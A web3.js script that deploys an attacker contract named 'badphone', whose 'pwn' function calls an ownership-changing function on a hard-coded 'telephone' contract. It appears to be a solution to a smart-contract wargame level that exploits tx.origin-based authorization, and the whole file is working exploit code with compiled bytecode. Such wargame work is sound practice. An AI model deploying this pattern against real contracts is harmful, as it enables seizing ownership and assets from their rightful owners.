var _telephone = "0xe7781e649ddfdf78c150667ead2fde9237d90353"
var badphoneContract = web3.eth.contract([
  {
    constant: false,
    inputs: [{ name: "_owner", type: "address" }],
    name: "pwn",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "telephone",
    outputs: [{ name: "", type: "address" }],
    payable: false,
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [{ name: "_telephone", type: "address" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor"
  }
])
var badphone = badphoneContract.new(
  _telephone,
  {
    from: web3.eth.accounts[0],
    data:
      "0x6060604052341561000f57600080fd5b60405160208061027d83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506102028061007b6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806302c6591d1461005157806393acaa591461008a575b600080fd5b341561005c57600080fd5b610088600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100df565b005b341561009557600080fd5b61009d6101b1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b151561019a57600080fd5b6102c65a03f115156101ab57600080fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820f68e0729b8744f80c68eeb99484262e222c449231e08246755aa550e7e4734cd0029",
    gas: "4700000"
  },
  function(e, contract) {
    console.info(e, contract)
    if (typeof contract.address !== "undefined") {
      console.info(
        "Contract mined! address: " + contract.address + " transactionHash: " + contract.transactionHash
      )
    }
  }
)
